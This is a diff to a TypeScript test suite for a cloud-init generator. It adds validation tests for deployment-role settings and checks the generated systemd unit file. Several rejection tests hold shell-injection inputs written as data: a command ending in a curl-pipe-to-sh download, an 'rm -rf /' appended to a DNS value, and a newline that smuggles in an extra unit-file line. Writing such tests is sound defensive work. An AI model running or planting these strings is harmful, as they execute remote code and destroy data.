@@ -457,6 +457,20 @@ describe('generateCloudInit', () => {
       expect(cfInsertIdx).toBeGreaterThan(dropIdx);
     });
 
+    it('firewall script carries no OCI receiver port plumbing', () => {
+      const config = generateCloudInit(baseVariables());
+      const parsed = YAML.parse(config);
+
+      const firewallScript = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
+      );
+      const content: string = firewallScript.content;
+
+      // The host-side build flow replaced the in-VM OCI receiver entirely, so no
+      // firewall rules or port variable for it should remain.
+      expect(content).not.toContain('OCI_RECEIVER_PORT');
+    });
+
     it('firewall script fetches Cloudflare IPs with fallback defaults', () => {
       const config = generateCloudInit(baseVariables());
       const parsed = YAML.parse(config);
@@ -918,6 +932,10 @@ describe('validateCloudInitVariables', () => {
         logJournalMaxRetention: '14day',
         dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
         devcontainerCacheEnabled: 'true',
+        deployAcmeEmail: 'ops@example.com',
+        deployAcmeCa: 'https://acme-staging-v02.api.letsencrypt.org/directory',
+        deployComposeCmd: '/usr/local/bin/docker compose',
+        deployHealthTimeout: '1m30s',
       }))).not.toThrow();
     });
 
@@ -1017,6 +1035,18 @@ describe('validateCloudInitVariables', () => {
         dockerDnsServers: '"1.1.1.1"; rm -rf /',
       }))).toThrow('dockerDnsServers');
     });
+
+    it('rejects deployment compose command shell injection', () => {
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployComposeCmd: 'docker compose; curl https://example.com/x | sh',
+      }))).toThrow('deployComposeCmd');
+    });
+
+    it('rejects deployment ACME email newline injection', () => {
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployAcmeEmail: 'ops@example.com\nEnvironment=DEPLOY_COMPOSE_CMD=sh',
+      }))).toThrow('deployAcmeEmail');
+    });
   });
 
   describe('rejects invalid formats', () => {
@@ -1042,6 +1072,24 @@ describe('validateCloudInitVariables', () => {
       expect(() => validateCloudInitVariables(baseVariables({
         controlPlaneUrl: 'http://api.example.com',
       }))).toThrow('controlPlaneUrl');
+    });
+
+    it('rejects HTTP (non-HTTPS) deployAcmeCa', () => {
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployAcmeCa: 'http://acme.example.com/directory',
+      }))).toThrow('deployAcmeCa');
+    });
+
+    it('rejects invalid deployAcmeEmail', () => {
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployAcmeEmail: 'not-an-email',
+      }))).toThrow('deployAcmeEmail');
+    });
+
+    it('rejects invalid deployHealthTimeout', () => {
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployHealthTimeout: 'five minutes',
+      }))).toThrow('deployHealthTimeout');
     });
 
     it('rejects vmAgentPort of 0', () => {
@@ -1802,6 +1850,10 @@ describe('deployment role support', () => {
         role: 'deployment',
         environmentId: 'env-abc123',
         deploySigningPubKey: 'deploy-pub-key-abc123+/=',
+        deployAcmeEmail: 'ops@example.com',
+        deployAcmeCa: 'https://acme-staging-v02.api.letsencrypt.org/directory',
+        deployComposeCmd: '/usr/local/bin/docker compose',
+        deployHealthTimeout: '7m',
       }),
       { validateSize: false },
     );
@@ -1815,6 +1867,10 @@ describe('deployment role support', () => {
     expect(unitFile.content).toContain('Environment=NODE_ROLE=deployment');
     expect(unitFile.content).toContain('Environment=ENVIRONMENT_ID=env-abc123');
     expect(unitFile.content).toContain('Environment=DEPLOY_SIGNING_PUB_KEY=deploy-pub-key-abc123+/=');
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_EMAIL=ops@example.com');
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_CA=https://acme-staging-v02.api.letsencrypt.org/directory');
+    expect(unitFile.content).toContain('Environment="DEPLOY_COMPOSE_CMD=/usr/local/bin/docker compose"');
+    expect(unitFile.content).toContain('Environment=DEPLOY_HEALTH_TIMEOUT=7m');
   });
 
   it('leaves deployment environment empty when not specified', () => {
@@ -1833,6 +1889,10 @@ describe('deployment role support', () => {
     expect(unitFile.content).toContain('Environment=NODE_ROLE=\n');
     expect(unitFile.content).toContain('Environment=ENVIRONMENT_ID=\n');
     expect(unitFile.content).toContain('Environment=DEPLOY_SIGNING_PUB_KEY=\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_EMAIL=\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_CA=\n');
+    expect(unitFile.content).toContain('Environment="DEPLOY_COMPOSE_CMD="\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_HEALTH_TIMEOUT=\n');
   });
 
   it('generates valid YAML with deployment role set', () => {
